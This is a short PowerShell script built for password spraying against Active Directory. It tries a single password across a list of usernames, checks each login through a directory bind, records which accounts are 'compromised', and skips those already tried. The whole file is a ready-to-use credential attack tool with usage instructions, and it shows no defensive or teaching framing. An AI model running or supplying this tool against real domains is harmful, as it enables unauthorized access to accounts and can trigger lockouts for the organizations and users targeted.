Function adcheck {
  param($u,$p)
  (new-object directoryservices.directoryentry "",$u,$p).psbase.name -ne $null
}
 
Function smblogin {
  param($userlist,$domain,$pwd)

  if (!$pwd) {
    Write-Host "usage: smblogin <userlist.txt> <domain> <password>"
    Write-Host " e.g.: smblogin users.txt domain.com P@ssw0rd`n"
    return
  }
  $results = ".\smblogin.$pwd.txt"

  foreach($line in Get-Content $userlist) {
    $x = (gc $results -EA SilentlyContinue | select-string "^$line,.*,True$")
    if ($x) {
      Write-Host "user $line already compromised"
      continue
    }
    $x = (gc $results | select-string -CaseSensitive "^$line,$pwd,")
    if ($x) {
      Write-Host "user $line with $pwd already tried"
      continue
    }
    $output = "$line,$pwd,"
    $output += adcheck "$domain\$line" "$pwd"
    Write-Host "$output"
    echo $output >>$results
  }
}
